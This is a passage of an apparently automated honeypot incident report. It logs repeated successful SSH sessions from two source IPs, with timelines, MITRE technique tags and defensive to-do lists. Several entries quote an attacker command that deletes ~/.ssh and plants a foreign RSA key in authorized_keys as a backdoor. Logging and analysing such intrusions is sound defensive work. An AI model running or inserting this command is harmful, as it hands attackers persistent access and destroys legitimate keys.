| `2026-04-24 13:33:59` | `cowrie.command.input` |
| `2026-04-24 13:33:59` | `cowrie.command.failed` |
| `2026-04-24 13:33:59` | `cowrie.log.closed` |
| `2026-04-24 13:33:59` | `cowrie.session.params` |
| `2026-04-24 13:33:59` | `cowrie.command.input` |
| `2026-04-24 13:33:59` | `cowrie.session.file_download` |
| `2026-04-24 13:33:59` | `cowrie.log.closed` |
| `2026-04-24 13:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745fe873f1e1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:34 |
| **Last Seen** | 2026-04-24 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:34:01` | `cowrie.session.connect` |
| `2026-04-24 13:34:01` | `cowrie.client.version` |
| `2026-04-24 13:34:01` | `cowrie.client.kex` |
| `2026-04-24 13:34:02` | `cowrie.login.success` |
| `2026-04-24 13:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f39e8cd9a2

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:34 |
| **Last Seen** | 2026-04-24 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:34:24` | `cowrie.session.connect` |
| `2026-04-24 13:34:24` | `cowrie.client.version` |
| `2026-04-24 13:34:24` | `cowrie.client.kex` |
| `2026-04-24 13:34:25` | `cowrie.login.success` |
| `2026-04-24 13:34:25` | `cowrie.session.params` |
| `2026-04-24 13:34:25` | `cowrie.command.input` |
| `2026-04-24 13:34:25` | `cowrie.command.failed` |
| `2026-04-24 13:34:25` | `cowrie.log.closed` |
| `2026-04-24 13:34:25` | `cowrie.session.params` |
| `2026-04-24 13:34:25` | `cowrie.command.input` |
| `2026-04-24 13:34:25` | `cowrie.session.file_download` |
| `2026-04-24 13:34:25` | `cowrie.log.closed` |
| `2026-04-24 13:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e09e945713

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:34 |
| **Last Seen** | 2026-04-24 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:34:27` | `cowrie.session.connect` |
| `2026-04-24 13:34:27` | `cowrie.client.version` |
| `2026-04-24 13:34:27` | `cowrie.client.kex` |
| `2026-04-24 13:34:28` | `cowrie.login.success` |
| `2026-04-24 13:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed94f0250f4e

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:35 |
| **Last Seen** | 2026-04-24 13:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:35:22` | `cowrie.session.connect` |
| `2026-04-24 13:35:22` | `cowrie.client.version` |
| `2026-04-24 13:35:22` | `cowrie.client.kex` |
| `2026-04-24 13:35:22` | `cowrie.login.success` |
| `2026-04-24 13:35:22` | `cowrie.session.params` |
| `2026-04-24 13:35:22` | `cowrie.command.input` |
| `2026-04-24 13:35:22` | `cowrie.command.failed` |
| `2026-04-24 13:35:22` | `cowrie.log.closed` |
| `2026-04-24 13:35:23` | `cowrie.session.params` |
| `2026-04-24 13:35:23` | `cowrie.command.input` |
| `2026-04-24 13:35:23` | `cowrie.session.file_download` |
| `2026-04-24 13:35:23` | `cowrie.log.closed` |
| `2026-04-24 13:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee305114469d

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:35 |
| **Last Seen** | 2026-04-24 13:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:35:25` | `cowrie.session.connect` |
| `2026-04-24 13:35:25` | `cowrie.client.version` |
| `2026-04-24 13:35:25` | `cowrie.client.kex` |
| `2026-04-24 13:35:25` | `cowrie.login.success` |
| `2026-04-24 13:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9fb7b1cacc

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:35 |
| **Last Seen** | 2026-04-24 13:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:35:52` | `cowrie.session.connect` |
| `2026-04-24 13:35:52` | `cowrie.client.version` |
| `2026-04-24 13:35:52` | `cowrie.client.kex` |
| `2026-04-24 13:35:53` | `cowrie.login.success` |
| `2026-04-24 13:35:53` | `cowrie.session.params` |
| `2026-04-24 13:35:53` | `cowrie.command.input` |
| `2026-04-24 13:35:53` | `cowrie.command.failed` |
| `2026-04-24 13:35:53` | `cowrie.log.closed` |
| `2026-04-24 13:35:53` | `cowrie.session.params` |
| `2026-04-24 13:35:53` | `cowrie.command.input` |
| `2026-04-24 13:35:53` | `cowrie.session.file_download` |
| `2026-04-24 13:35:53` | `cowrie.log.closed` |
| `2026-04-24 13:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbcb2dd96506

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:35 |
| **Last Seen** | 2026-04-24 13:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:35:55` | `cowrie.session.connect` |
| `2026-04-24 13:35:55` | `cowrie.client.version` |
| `2026-04-24 13:35:55` | `cowrie.client.kex` |
| `2026-04-24 13:35:56` | `cowrie.login.success` |
| `2026-04-24 13:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69771c166224

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:36 |
| **Last Seen** | 2026-04-24 13:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:36:18` | `cowrie.session.connect` |
| `2026-04-24 13:36:18` | `cowrie.client.version` |
| `2026-04-24 13:36:18` | `cowrie.client.kex` |
| `2026-04-24 13:36:19` | `cowrie.login.success` |
| `2026-04-24 13:36:19` | `cowrie.session.params` |
| `2026-04-24 13:36:19` | `cowrie.command.input` |
| `2026-04-24 13:36:19` | `cowrie.command.failed` |
| `2026-04-24 13:36:19` | `cowrie.log.closed` |
| `2026-04-24 13:36:19` | `cowrie.session.params` |
| `2026-04-24 13:36:19` | `cowrie.command.input` |
| `2026-04-24 13:36:20` | `cowrie.session.file_download` |
| `2026-04-24 13:36:20` | `cowrie.log.closed` |
| `2026-04-24 13:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8598a0d3c7

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:36 |
| **Last Seen** | 2026-04-24 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:36:21` | `cowrie.session.connect` |
| `2026-04-24 13:36:21` | `cowrie.client.version` |
| `2026-04-24 13:36:22` | `cowrie.client.kex` |
| `2026-04-24 13:36:22` | `cowrie.login.success` |
| `2026-04-24 13:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7b0805abc6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:38 |
| **Last Seen** | 2026-04-24 13:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:38:39` | `cowrie.session.connect` |
| `2026-04-24 13:38:39` | `cowrie.client.version` |
| `2026-04-24 13:38:39` | `cowrie.client.kex` |
| `2026-04-24 13:38:40` | `cowrie.login.success` |
| `2026-04-24 13:38:40` | `cowrie.session.params` |
| `2026-04-24 13:38:40` | `cowrie.command.input` |
| `2026-04-24 13:38:40` | `cowrie.command.failed` |
| `2026-04-24 13:38:40` | `cowrie.log.closed` |
| `2026-04-24 13:38:40` | `cowrie.session.params` |
| `2026-04-24 13:38:40` | `cowrie.command.input` |
| `2026-04-24 13:38:40` | `cowrie.session.file_download` |
| `2026-04-24 13:38:40` | `cowrie.log.closed` |
| `2026-04-24 13:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6750b765185

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:38 |
| **Last Seen** | 2026-04-24 13:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:38:42` | `cowrie.session.connect` |
| `2026-04-24 13:38:42` | `cowrie.client.version` |
| `2026-04-24 13:38:42` | `cowrie.client.kex` |
| `2026-04-24 13:38:43` | `cowrie.login.success` |
| `2026-04-24 13:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85786e059ee

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:39 |
| **Last Seen** | 2026-04-24 13:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:39:06` | `cowrie.session.connect` |
| `2026-04-24 13:39:06` | `cowrie.client.version` |
| `2026-04-24 13:39:06` | `cowrie.client.kex` |
| `2026-04-24 13:39:06` | `cowrie.login.success` |
| `2026-04-24 13:39:07` | `cowrie.session.params` |
| `2026-04-24 13:39:07` | `cowrie.command.input` |
| `2026-04-24 13:39:07` | `cowrie.command.failed` |
| `2026-04-24 13:39:07` | `cowrie.log.closed` |
| `2026-04-24 13:39:07` | `cowrie.session.params` |
| `2026-04-24 13:39:07` | `cowrie.command.input` |
| `2026-04-24 13:39:07` | `cowrie.session.file_download` |
| `2026-04-24 13:39:07` | `cowrie.log.closed` |
| `2026-04-24 13:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabc64b2a473

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:39 |
| **Last Seen** | 2026-04-24 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:39:09` | `cowrie.session.connect` |
| `2026-04-24 13:39:09` | `cowrie.client.version` |
| `2026-04-24 13:39:09` | `cowrie.client.kex` |
| `2026-04-24 13:39:09` | `cowrie.login.success` |
| `2026-04-24 13:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc9eb8dfa77

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:40 |
| **Last Seen** | 2026-04-24 13:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:40:18` | `cowrie.session.connect` |
| `2026-04-24 13:40:18` | `cowrie.client.version` |
| `2026-04-24 13:40:18` | `cowrie.client.kex` |
| `2026-04-24 13:40:18` | `cowrie.login.success` |
| `2026-04-24 13:40:18` | `cowrie.session.params` |
| `2026-04-24 13:40:18` | `cowrie.command.input` |
| `2026-04-24 13:40:18` | `cowrie.command.failed` |
| `2026-04-24 13:40:18` | `cowrie.log.closed` |
| `2026-04-24 13:40:19` | `cowrie.session.params` |
| `2026-04-24 13:40:19` | `cowrie.command.input` |
| `2026-04-24 13:40:19` | `cowrie.session.file_download` |
| `2026-04-24 13:40:19` | `cowrie.log.closed` |
| `2026-04-24 13:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a736550e2ca

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:40 |
| **Last Seen** | 2026-04-24 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:40:21` | `cowrie.session.connect` |
| `2026-04-24 13:40:21` | `cowrie.client.version` |
| `2026-04-24 13:40:21` | `cowrie.client.kex` |
| `2026-04-24 13:40:21` | `cowrie.login.success` |
| `2026-04-24 13:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9d9b88199c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:40 |
| **Last Seen** | 2026-04-24 13:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:40:34` | `cowrie.session.connect` |
| `2026-04-24 13:40:34` | `cowrie.client.version` |
| `2026-04-24 13:40:34` | `cowrie.client.kex` |
| `2026-04-24 13:40:34` | `cowrie.login.success` |
| `2026-04-24 13:40:35` | `cowrie.session.params` |
| `2026-04-24 13:40:35` | `cowrie.command.input` |
| `2026-04-24 13:40:35` | `cowrie.command.failed` |
| `2026-04-24 13:40:35` | `cowrie.log.closed` |
| `2026-04-24 13:40:35` | `cowrie.session.params` |
| `2026-04-24 13:40:35` | `cowrie.command.input` |
| `2026-04-24 13:40:35` | `cowrie.session.file_download` |
| `2026-04-24 13:40:35` | `cowrie.log.closed` |
| `2026-04-24 13:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e24e9dc13e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:40 |
| **Last Seen** | 2026-04-24 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:40:37` | `cowrie.session.connect` |
| `2026-04-24 13:40:37` | `cowrie.client.version` |
| `2026-04-24 13:40:37` | `cowrie.client.kex` |
| `2026-04-24 13:40:38` | `cowrie.login.success` |
| `2026-04-24 13:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
